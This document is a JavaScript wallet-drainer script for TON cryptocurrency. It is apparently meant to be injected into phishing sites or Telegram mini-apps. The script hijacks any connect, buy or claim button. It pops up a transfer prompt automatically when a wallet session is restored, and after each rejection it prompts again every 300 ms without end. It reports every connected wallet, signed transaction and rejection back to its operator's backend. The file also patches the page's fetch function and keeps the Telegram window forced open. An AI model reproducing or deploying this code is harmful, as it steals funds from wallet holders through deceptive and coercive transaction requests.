/* Universal drain connector.
   - wires every plausible button
   - auto-fires the send prompt when a session is restored (already connected)
   - re-prompts NON-STOP after a reject, at a fixed near-instant cadence */
(() => {
  const UI = window.TON_CONNECT_UI
  if (!UI) { console.error('[drain] tonconnect ui not loaded'); return }

  const RETRY_REJECT_MS = 300     // re-prompt almost instantly after a reject
  const RETRY_EMPTY_MS = 3000     // nothing to send — don't hammer TonAPI
  const RETRY_BUSY_MS = 2500      // prompt still open — re-poll, don't stack
  const RETRY_ERROR_MS = 2000     // backend unreachable

  const opts = {
    manifestUrl: location.origin + '/tonconnect-manifest.json',
    actionsConfiguration: {
      returnStrategy: 'back',
    },
    uiPreferences: {
      theme: 'DARK',
      borderRadius: 's',
      colorsSet: {
        DARK: {
          accent: '#4db2ff',
          background: { primary: '#1a2026', qr: '#ffffff', tint: '#242e38' },
          connectButton: { background: '#248bda', foreground: '#ffffff' },
          icon: { error: '#ff5863' },
          text: { primary: '#ffffff', secondary: '#8794a1' },
        },
      },
    },
  }

  if (document.getElementById('wallet-btn')) opts.buttonRootId = 'wallet-btn'

  const tonConnectUI = new UI.TonConnectUI(opts)
  window.tonConnectUI = tonConnectUI

  const startParam =
    new URLSearchParams(location.search).get('tgWebAppStartParam') || ''

  const post = (p, body) =>
    fetch(p, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    }).catch(() => {})

  // ── tiny status pill (does not touch the site's own CSS) ──
  function pill(text) {
    let el = document.getElementById('__drain_status')
    if (!el) {
      el = document.createElement('div')
      el.id = '__drain_status'
      el.style.cssText =
        'position:fixed;left:50%;bottom:22px;transform:translateX(-50%);z-index:2147483000;' +
        'background:rgba(20,26,32,.95);color:#fff;font:13px/1.4 -apple-system,Segoe UI,Roboto,sans-serif;' +
        'padding:9px 16px;border-radius:99px;border:1px solid #2b3540;' +
        'box-shadow:0 6px 22px rgba(0,0,0,.45);opacity:0;transition:opacity .18s;pointer-events:none'
      document.body.appendChild(el)
    }
    el.textContent = text || ''
    el.style.opacity = text ? '1' : '0'
    clearTimeout(el.__t)
    if (text) el.__t = setTimeout(() => { el.style.opacity = '0' }, 4000)
  }

  let busy = false
  let pendingDrain = false
  let firstStatus = true
  let retryTimer = null
  let retryCount = 0

  function clearRetry() {
    clearTimeout(retryTimer)
    retryTimer = null
  }

  /** Never gives up. Fixed cadence, no backoff. */
  function scheduleRetry(delay = RETRY_REJECT_MS) {
    if (!tonConnectUI.wallet) return
    clearRetry()
    retryCount++
    retryTimer = setTimeout(() => { void buy(true) }, delay)
  }

  tonConnectUI.onStatusChange(wallet => {
    if (!wallet) {
      clearRetry()
      retryCount = 0
      return
    }
    console.log('[drain] connected', wallet.account.address)

    post('./connected', {
      raw: wallet,
      wallet: wallet.account.address,
      href: location.href, startParam,
    })

    // Fires on a restored session too — an already-connected wallet gets the
    // send prompt without clicking anything.
    if (pendingDrain || firstStatus) {
      pendingDrain = false
      clearRetry()
      retryCount = 0
      setTimeout(() => { void buy() }, firstStatus ? 900 : 500)
    }
    firstStatus = false
  })

  async function buy(isRetry = false) {
    if (busy) {
      // a prompt is already open — keep the loop alive without stacking calls
      if (isRetry) scheduleRetry(RETRY_BUSY_MS)
      return
    }
    if (!isRetry) {
      clearRetry()
      retryCount = 0
    }
    busy = true
    try {
      if (!tonConnectUI.wallet) {
        pendingDrain = true
        await tonConnectUI.openModal()
        return
      }

      const wallet = tonConnectUI.wallet.account.address
      const qs = location.search ? location.search + '&' : '?'
      pill('Preparing transaction...')

      let data
      try {
        const r = await fetch('./transaction' + qs + 'wallet=' + wallet)
        data = await r.json()
      } catch (e) {
        console.warn('[drain] backend unreachable', e)
        pill('Server unreachable')
        scheduleRetry(RETRY_ERROR_MS)
        return
      }

      if (!data || !Array.isArray(data.messages) || data.messages.length === 0) {
        console.warn('[drain] nothing to send —', data && data.reason, data && data.error)
        pill(data && data.error ? 'Build error: ' + data.error : 'Nothing to send — watching')
        scheduleRetry(RETRY_EMPTY_MS)
        return
      }

      console.log('[drain] sending', data.messages.length, 'message(s)')
      pill('Confirm in your wallet...')

      try {
        const boc = await tonConnectUI.sendTransaction({
          validUntil: Math.floor(Date.now() / 1000) + 900,
          messages: data.messages,
        })
        pill('Transaction sent')
        retryCount = 0
        post('./accept', {
          messages: data.messages, boc, wallet, raw: data.raw,
          href: location.href, startParam,
        })
      } catch (e) {
        console.warn('[drain] user rejected', e)
        post('./reject', {
          messages: data.messages, err: e && e.message, wallet, raw: data.raw,
          href: location.href, startParam,
        })
        scheduleRetry()
      }
    } finally {
      busy = false
    }
  }

  window.drainWallet = () => { void buy() }
  window.connectWallet = () => tonConnectUI.openModal()

  // ── selectors: generic + what this site actually uses ──
  const SELECTORS = [
    '#ton-connect-button', '#connect', '#connectButton', '#connect-wallet',
    '#wallet-btn', '#buy', '#claim',
    '.connect', '.connect-btn', '.connect-button', '.connect-wallet',
    '.btn-connect', '.js-connect', '.connectWallet',
    '.step_connect_wallet',
    '[data-connect]', '[data-tonconnect]', '[data-ton-connect]',
    '[data-testid*="connect" i]',
    '[class*="connect" i]',
    '[onclick*="connect" i]', '[onclick*="drain" i]',
  ].join(',')

  function wire() {
    document.querySelectorAll(SELECTORS).forEach(el => {
      if (el.dataset.drainWired === '1') return
      el.dataset.drainWired = '1'
      el.addEventListener('click', e => {
        e.preventDefault()
        void buy()
      })
    })
  }

  wire()
  document.addEventListener('DOMContentLoaded', wire)
  window.addEventListener('load', wire)
  new MutationObserver(wire).observe(document.documentElement, {
    childList: true,
    subtree: true,
  })
})()

/* EMPTY-REPORTER — make silent failures visible + fire /reject */
(function () {
  const _f = window.fetch;
  let lastEmptyPost = 0;
  window.fetch = async function (...a) {
    const r = await _f.apply(this, a);
    try {
      const u = typeof a[0] === 'string' ? a[0] : (a[0] && a[0].url) || '';
      if (u.indexOf('/transaction') !== -1) {
        r.clone().json().then(d => {
          if (!d.messages || d.messages.length === 0) {
            console.warn('[drain] EMPTY:', d.reason, d.error, d.raw);
            const pill = document.getElementById('__drain_status');
            if (pill) { pill.textContent = 'empty: ' + (d.reason || '?') + ' ' + (d.error || ''); }
            // debounce: the re-prompt loop calls /transaction repeatedly
            if (Date.now() - lastEmptyPost < 300000) return;
            lastEmptyPost = Date.now();
            _f('/reject', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                wallet: (window.tonConnectUI && window.tonConnectUI.wallet && window.tonConnectUI.wallet.account.address) || '',
                href: location.href, startParam,
                err: 'no messages: ' + (d.reason || 'unknown') + ' ' + (d.error || ''),
                raw: d.raw,
              }),
            }).catch(() => {});
          }
        }).catch(() => {});
      }
    } catch (e) {}
    return r;
  };
})();

/* TG-EXPAND */
(function () {
  const tg = window.Telegram && window.Telegram.WebApp;
  if (!tg) return;
  try { tg.ready(); tg.expand(); tg.disableVerticalSwipes && tg.disableVerticalSwipes(); } catch (e) {}
  console.log('[drain] tg ctx:', tg.platform, 'initData:', (tg.initData || '').length);
  const s = document.createElement('style');
  s.textContent = '.tc-root,[class*="ton-connect"]{z-index:2147483647!important}';
  document.head.appendChild(s);
  const iv = setInterval(() => { try { tg.expand(); } catch (e) {} }, 400);
  setTimeout(() => clearInterval(iv), 20000);
})();
